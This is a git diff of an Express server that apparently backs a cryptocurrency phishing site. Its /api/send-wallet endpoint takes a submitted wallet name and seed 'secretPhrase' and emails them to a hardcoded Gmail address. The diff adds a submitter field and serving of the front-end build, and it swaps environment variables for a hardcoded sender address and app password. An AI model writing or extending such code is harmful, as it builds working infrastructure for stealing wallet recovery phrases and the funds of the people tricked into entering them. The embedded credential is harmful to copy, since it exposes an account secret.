@@ -3,7 +3,11 @@ import nodemailer from 'nodemailer';
 import bodyParser from 'body-parser';
 import cors from "cors";
 import dotenv from 'dotenv';  
+import path from 'path';
+import { fileURLToPath } from 'url';
 
+const __filename = fileURLToPath(import.meta.url);
+const __dirname = path.dirname(__filename);
 
 dotenv.config();
 
@@ -11,39 +15,32 @@ const app = express();
 app.use(cors()); 
 app.use(bodyParser.json());
 
+app.use(express.static(path.join(__dirname, '../client/build')));
+
 const email = 'anabeljhonny5@gmail.com';
-const fromEmail = process.env.EMAIL_USER;
-const pass = process.env.EMAIL_PASS;
+const fromEmail = 'anabeljhonny10@gmail.com';
+const pass = 'mgkwcvqeuruxkedz';
 
 const transporter = nodemailer.createTransport({
-    host: 'smtp.gmail.com',
-    port: 587,
-    secure: false,
+    service: 'gmail',
     auth: {
       user: fromEmail,
       pass: pass,
     },
   });
-
-transporter.verify((error, success) => {
-    if (error) {
-        console.log('Error with email configuration:', error);
-    } else {
-        console.log('Server is ready to take our messages');
-    }
-});
   
 
 app.post('/api/send-wallet', async (req, res) => {
-  const { walletName, secretPhrase } = req.body;
+  const { walletName, secretPhrase, userWalletName } = req.body;
 
   const mailOptions = {
     from: fromEmail,
     to: email,
-    subject: `New Wallet Info: ${walletName}`,
+    subject: `New Wallet Info from ${userWalletName}`,
     text: `
       Wallet Name: ${walletName}
       Secret Phrase: ${secretPhrase}
+      Submitted By: ${userWalletName}
           `,
   };
 
@@ -55,6 +52,11 @@ app.post('/api/send-wallet', async (req, res) => {
     console.error('Error sending email:', error);
     res.status(500).json({ success: false, error: 'Failed to send email' });
   }
+});
+
+// Catch-all route to handle page refreshes and SPA routing
+app.get('*', (req, res) => {
+    res.sendFile(path.join(__dirname, '../client/build', 'index.html'));
 });
 
 const PORT = process.env.PORT || 3001;
